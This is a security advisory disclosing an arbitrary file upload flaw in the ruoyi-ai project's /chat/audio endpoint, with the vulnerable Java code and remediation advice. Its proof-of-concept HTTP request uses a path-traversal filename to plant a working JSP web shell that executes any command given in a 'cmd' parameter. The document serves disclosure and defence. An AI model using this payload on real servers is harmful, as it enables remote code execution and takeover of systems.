# Vulnerability Description

The open source project "[ageerle/ruoyi-ai](https://github.com/ageerle/ruoyi-ai)" which implements AI chat and painting functions based on ruoyi-plus has an arbitrary file upload vulnerability, which allows attackers to upload any malicious files to any path on the server, resulting in the risk of arbitrary code execution and arbitrary file overwriting on the server.

- Vulnerability Discloser: [Tr0e](https://github.com/Tr0e)

- Vendors:  [GitHub-ageerle/ruoyi-ai](https://github.com/ageerle/ruoyi-ai)

- Source code address： [GitHub-ageerle/ruoyi-ai](https://github.com/ageerle/ruoyi-ai)

Related reports online link:

- https://github.com/ageerle/ruoyi-ai/issues/9

- [Tr0e/CVE_Hunter · ruoyi-ai/ruoyi-ai_RCE.md](https://github.com/Tr0e/CVE_Hunter/blob/main/ruoyi-ai/ruoyi-ai_RCE.md)

Note: **This vulnerability was discovered automatically by my AI code audit tool**.

# Vulnerability Analysis

The vulnerability code entry point is located at：

- [https://github.com/ageerle/ruoyi-ai/blob/main/ruoyi-modules/ruoyi-fusion/src/main/java/org/ruoyi/fusion/controller/ChatController.java#L80](https://github.com/ageerle/ruoyi-ai/blob/main/ruoyi-modules/ruoyi-fusion/src/main/java/org/ruoyi/fusion/controller/ChatController.java#L80)

- https://github.com/ageerle/ruoyi-ai/blob/main/ruoyi-modules/ruoyi-system/src/main/java/org/ruoyi/system/service/impl/SseServiceImpl.java#L329

The complete relevant code information of the vulnerability exploit chain is as follows:

```java
//ruoyi-modules\ruoyi-fusion\src\main\java\org\ruoyi\fusion\controller\ChatController.java 
    /**
     * 语音转文本
     *
     * @param file
     */
    @PostMapping("/audio")
    @ResponseBody
    public WhisperResponse audio(@RequestParam("file") MultipartFile file) {
        WhisperResponse whisperResponse = ISseService.speechToTextTranscriptionsV2(file);
        return whisperResponse;
    }

//ruoyi-modules\ruoyi-system\src\main\java\org\ruoyi\system\service\impl\SseServiceImpl.java
   /**
     * 语音转文字
     */
    @Override
    public WhisperResponse speechToTextTranscriptionsV2(MultipartFile file) {
        // 确保文件不为空
        if (file.isEmpty()) {
            throw new IllegalStateException("Cannot convert an empty MultipartFile");
        }
        // 创建一个文件对象
        File fileA = new File(System.getProperty("java.io.tmpdir") + File.separator + file.getOriginalFilename());
        try {
            // 将 MultipartFile 的内容写入文件
            file.transferTo(fileA);
        } catch (IOException e) {
            throw new RuntimeException("Failed to convert MultipartFile to File", e);
        }
        return openAiStreamClient.speechToTextTranscriptions(fileA);
    }
```

As you can see, the external API entry `/audio` receives the MultipartFile uploaded by the user and directly passes it to the `ISseService.speechToTextTranscriptionsV2` function for processing. At the same time, the `speechToTextTranscriptionsV2` function directly references the user-controllable file name and suffix as the final file path and name saved on the server without any security check, thus forming a typical file upload vulnerability.

Attackers can use this vulnerability to upload malicious Trojan files to the victim's server, thereby controlling the server or overwriting any file on the server, causing serious impact on the target server.

# Vulnerability Verification

Please first build the project local environment according to the steps provided by the project source code author in the Readme file.

The vulnerability proof of concept (POC) is as follows:

```js
POST /chat/audio HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
Content-Length: 628

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="file"; filename="../../shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
------WebKitFormBoundary7MA4YWxk--
```

# Security Suggestions

Please limit the uploaded file types and check the file suffixes to prevent attackers from uploading malicious Trojan programs.

At the same time, the uploaded file path needs to be strictly restricted, and it is forbidden to use the file name information transmitted by the front end to splice the final file storage path
